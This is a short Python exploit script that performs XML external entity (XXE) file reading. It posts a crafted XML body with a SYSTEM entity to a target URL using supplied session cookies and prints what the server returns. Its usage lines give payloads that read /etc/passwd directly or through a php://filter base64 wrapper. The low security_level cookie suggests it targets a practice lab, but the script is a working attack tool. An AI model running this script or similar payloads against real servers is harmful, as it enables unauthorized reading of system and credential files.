#!/usr/bin/env python3
# -*- encoding: utf-8 -*-
#Author: afei

import requests, sys

def xxe_Fileread():
    if(len(sys.argv) < 4):
        print("-----------------------------------------------")
        print(" ")
        print("Useg: python %s <url> <cookies> <payload>" % sys.argv[0])
        print("eg1: python XXE_filereading_exp.py http://x.x.x.x/x 'PHPSESSID':'xxx','security_level':'0' file:///etc/passwd" )
        print("eg2: python XXE_filereading_exp.py http://x.x.x.x/x 'PHPSESSID':'xxx','security_level':'0' php://filter/read=convert.base64-encode/resource=/etc/passwd" )
        print(" ")
        print("-----------------------------------------------")
        return
        
    url = sys.argv[1]
    cookie1 = sys.argv[2]
    payload = sys.argv[3]
    
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0',
        'Accept': '*',
        'Content-type':'text/xml'
    }
    
    cookies = {'PHPSESSID':cookie1, 'security_level':'0'}
    
    xml = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root[<!ENTITY test SYSTEM "'+ payload +'">]><reset><login>&test;</login><secret>login</secret></reset>'
    
    dataresult = requests.post(url,headers=headers,cookies=cookies,data=xml).content
    result = dataresult.split( )
    print('xxe攻击返回结果: \n %s' %result)
    

if __name__ == '__main__':
    xxe_Fileread()